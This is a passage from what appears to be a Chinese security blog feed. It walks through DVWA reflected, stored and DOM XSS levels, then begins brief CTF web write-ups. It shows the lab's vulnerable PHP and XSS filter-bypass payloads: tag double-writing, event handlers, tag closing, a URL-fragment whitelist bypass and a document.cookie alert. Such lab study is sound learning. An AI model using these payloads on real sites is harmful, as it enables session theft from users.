Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如url，location，referer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM-based XSS漏洞。</p></li><li><p><strong>反射型XSS：</strong>&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p></li><li><p><strong>存储型XSS：</strong>&lt;持久化&gt; 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p></li></ul><p>  作者：Jewel591<br>  链接：<a href="https://www.jianshu.com/p/4fcb4b411a66">https://www.jianshu.com/p/4fcb4b411a66</a><br>  来源：简书<br>  著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><h1 id="Reflected"><a href="#Reflected" class="headerlink" title="Reflected"></a>Reflected</h1><h2 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li><p>新函数</p><p>array_key_exists()函数</p><p>功能：检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。</p><p>语法：array_key_exists(<em>key,array</em>)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>key</em></td><td align="left">必需。规定键名。</td></tr><tr><td align="left"><em>array</em></td><td align="left">必需。规定数组。</td></tr></tbody></table></li></ul><p>我们可以看到对我们输入的数据没有进行过滤，在框内输入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p><p><img src="/2021/03/13/DVWA%E2%80%94XSS/3-1615702579223.png" alt="3"></p><p>直接获取用户的cookie：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="/2021/03/13/DVWA%E2%80%94XSS/4.png" alt="4"></p><h2 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们看到服务器对<code>&lt;script&gt;</code>进行了过滤处理，但是我们双写绕过就好了：<code>&lt;script&lt;script&gt;&gt;alert(1);&lt;/script&gt;</code></p><p>或者大小写绕过：<code>&lt;Script&gt;alert(1);&lt;/script&gt;</code></p><p><img src="/2021/03/13/DVWA%E2%80%94XSS/5.png" alt="5"></p><h2 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到服务器使用了正则表达式禁用了<script>标签，但是我们还可以通过<code>img</code>、<code>body</code>等标签的事件或者<code>iframe</code>等标签的<code>src</code>注入恶意的js代码。常用的HTML标签事件还有onerror,oneclick,onmouseover,onload等，</p><p>格式如下：onerror/onclick/onmouseover/onload=“执行内容”</p><p>1）<code>&lt;img src=&quot;&quot; onerror=alert(&#39;1&#39;)&gt;</code></p><ul><li>src 属性规定外部脚本文件的 URL。</li><li>onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。</li><li>这句话的意思是当加载img图片失败时执行onerror后的代码。</li></ul><p>2）<code>&lt;body onload=alert(&#39;1&#39;)&gt;</code></p><ul><li>onload 事件会在页面或图像加载完成后立即发生。</li></ul><p>3）<code>&lt;a href=&#39;&#39; onclick=alert(&#39;1&#39;)&gt;click me&lt;/a&gt;</code></p><ul><li>href是Hypertext Reference的缩写。意思是指定超链接目标的URL。href 属性的值可以是任何有效文档的相对或绝对<a href="https://baike.baidu.com/item/URL">URL</a>，包括片段标识符和JavaScript代码段。</li><li>onclick 事件会在元素被点击时发生</li><li>这句话中元素的名称为<code>click me</code>，当点击<code>click me</code>时会执行onclick后面的代码。</li></ul><p>4）<code>Iframe:&lt;body onload=alert(1)&gt;</code></p><ul><li>iframe:一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。</li></ul><p>5）<code>&lt;body onmousemove=alert(&#39;1&#39;)&gt;</code></p><ul><li>onmousemove 事件会在鼠标指针移到指定的对象时发生。</li><li>这句话有点没明白。</li></ul><h1 id="Stored"><a href="#Stored" class="headerlink" title="Stored"></a>Stored</h1><h2 id="Low：-1"><a href="#Low：-1" class="headerlink" title="Low："></a>Low：</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到服务器对我们上传的数据做了过滤处理防止我们sql注入。但是没有预防xss，</p><p>在message栏输入：<code>&lt;script&gt;alert(1);&lt;/script&gt;</code><img src="DVWA%E2%80%94XSS/6.png" alt="6"></p><h2 id="Medium：-1"><a href="#Medium：-1" class="headerlink" title="Medium："></a>Medium：</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>新函数</li></ul><p><strong>htmlspecialchars()函数：</strong>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p><p><strong>strip_tags()函数：</strong>剥去字符串中的 HTML 标签。</p><p>我们可以看到js不会再把我们从message处上传的危险内容当作代码解析了，而且服务器对name也进行了过滤处理，但是我们还是可以通过双写和大小写绕过。但是这里我们发现name有输入字数限制，那我们就抓包修改name的值，<img src="DVWA%E2%80%94XSS/7-1615726611366.png" alt="7"></p><p>然后提交即可<img src="DVWA%E2%80%94XSS/6.png" alt="6"></p><h2 id="High：-1"><a href="#High：-1" class="headerlink" title="High："></a>High：</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>感觉和Flected类型High级别的绕过方法差不多，不再赘述了。</p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="Low：-2"><a href="#Low：-2" class="headerlink" title="Low："></a>Low：</h2><p>查看服务器端源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>服务器端没有任何php源码，因此用户输入全由前端js处理</p><p>查看前端源码：![1](DVWA—DOM Based Cross Site Scripting (XSS)/1.png)</p><p>我们可以看到前端通过GET的方式获取参数default的值，因此我们在url栏构造payload![2](DVWA—DOM Based Cross Site Scripting (XSS)/2.png)</p><ul><li>新函数：</li></ul><p><strong>alert()函数</strong></p><p>功能：用于显示带有一条指定消息和一个确定按钮的警告框。</p><p>语法：alert(message)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>message</td><td>要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）</td></tr></tbody></table><h2 id="Medium：-2"><a href="#Medium：-2" class="headerlink" title="Medium："></a>Medium：</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    $default = $_GET[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这道题搞了好久，一步一步来吧</p><p>1）先看网页源码：<img src="DVWA%E2%80%94XSS/8.png" alt="8"></p><p>2）尝试用之前学过的换标签的方式绕过：<code>&lt;img src=1 oneeror=alert(1)&gt;</code></p><p><img src="DVWA%E2%80%94XSS/9-1615818452797.png" alt="9"></p><p>发现不会像之前一样有弹窗跳出来，原因是我们的代码被<option>标签包裹了，因此我们尝试提前闭合</p><p>3）提前闭合option标签：<code>&gt;&lt;/option&gt;&lt;img src=1 oneeror=alert(1)&gt;</code></p><p><img src="DVWA%E2%80%94XSS/10.png" alt="10"></p><p>弹窗还是没有跳出来，那么我们也提前闭合select标签</p><p>4）提前闭合select标签：<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 oneeror=alert(1)&gt;</code></p><p><img src="DVWA%E2%80%94XSS/11.png" alt="11"></p><p>弹窗又成功弹出</p><h2 id="High：-2"><a href="#High：-2" class="headerlink" title="High："></a>High：</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>我们可以看到服务器设立了白名单。这里我们就可以利用DOM型xss的数据不经过服务器的特点来绕过了。</p><p>构造payload：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="DVWA%E2%80%94XSS/12.png" alt="12"></p><p>由于服务器以get方式获取default的值，而浏览器不会把URL中<code>#</code>后的内容提交到服务器，因此我们可以完美绕过。</p></script></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;—）XSS的中文名称叫跨站脚本，是WEB漏洞中比较常见的一种，特点就是可以将恶意HTML/JavaScript代码注入到受害用户浏览</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界web进阶</title>
    <link href="http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/"/>
    <id>http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/</id>
    <published>2021-03-12T09:23:20.000Z</published>
    <updated>2021-05-22T02:48:25.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h1><p>我们点击题目场景，发现跳转到1.php</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/1.png" alt="1"></p><p>查阅资料发现一般网站的初始页面都是index.php，于是在url中输入index.php，但是又自动跳转到1.php。</p><p>F12进入开发者模式，查看网络模块：</p><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/2.png" alt="2"></p><p>我们可以看到flag就在其中，同时发现网页跳转的原因就是<code>location</code>指向文件1.php。</p><p><strong>sp：</strong>location——用于重定向一个新的位置，包含一个新的url。表示用户应当到指定地址提取文件。</p><h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h1><p>本题主要考察对robots.txt的了解和作用。</p><p><strong>robots.txt文件</strong>是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它  。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。Robots.txt协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</p><p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p><ul><li><p>打开题目地址，看到这是一个对robots.txt的简介<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/3.png" alt="3"></p></li><li><p>访问一下这个网站的robots.txt</p></li></ul><p><img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/4.png" alt="4"></p><ul><li>网站不让我们访问这个fl0g.php，那我们就偏访问<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/5.png" alt="5"></li></ul><p>​       发现flag，收工</p><h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h1><p>没搞懂</p><p><a 